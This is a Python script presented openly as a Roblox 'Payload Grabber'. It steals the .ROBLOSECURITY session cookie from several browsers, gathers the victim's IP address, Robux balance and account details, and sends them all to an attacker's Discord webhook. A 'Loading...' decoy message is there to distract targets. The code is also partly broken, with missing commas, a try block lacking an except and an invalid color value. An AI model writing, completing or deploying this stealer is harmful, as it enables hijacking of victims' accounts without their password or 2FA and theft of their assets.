import os
import base64, codecs
import json

webhookk = "WEBHOOK" # Remove the word "webhook" and paste your own one there.

def command(c):
    os.system(c)
def cls():
    os.system("cls")

try:
    import robloxpy
    import requests,re
    from discordwebhook import *
    import browser_cookie3
except:
    command("py -m pip install discordwebhook")
    cls()
    command("py -m pip install robloxpy")
    cls()
    command("py -m pip install requests")
    cls()
    command("pip install discordwebhook")
    cls()
    command("pip install robloxpy")
    cls()
    command("pip install requests")
    cls()
    print("Run the app again.")
    exit()




dummy_message = "Loading..." # Easily distracts targets attention.
print(dummy_message)
################### Gathering INFOMATION #################################
def cookieLogger():

    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used to log into the specific account without password or 2fa.)

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass


cookies = cookieLogger()


#################### INFOMATION #################
ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = cookies[1]
#################### checking cookie #############
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    isvalid = "Valid"
else:
    requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
    exit()

#################### getting info about the cookie #############
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
dnso = None
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']
#################### SENDING TO WEBHOOK #################


discord = Discord(url=webhookk)
discord.post(
    username="Payload Grabber"
    avatar_url="https://cdn.discordapp.com/attachments/991075594420748319/1043931056073621744/Main_Logo.png",
    embeds=[
        {
            "username": "Payload Grabber"
            "title": "🔥+1 NEW HIT!🔥"
            "description" : f"[Source Code](https://github.com/TheGeekLucas/NEO-Grabber) | [Rolimons]({rolimons}) This is open source payload. You can edit it aswell.",
            "color" : 8819de,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Has Premium", "value": premium,"inline": True},
                {"name": "Creation Date", "value": crdate, "inline": True},
                {"name" : "RAP", "value": rap,"inline": True},
                {"name" : "Friends", "value": friends, "inline": True},
                {"name" : "Account Age", "value": age, "inline": True},
                {"name" : "IP Address", "value" : ip_address, "inline:": True},
                {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)
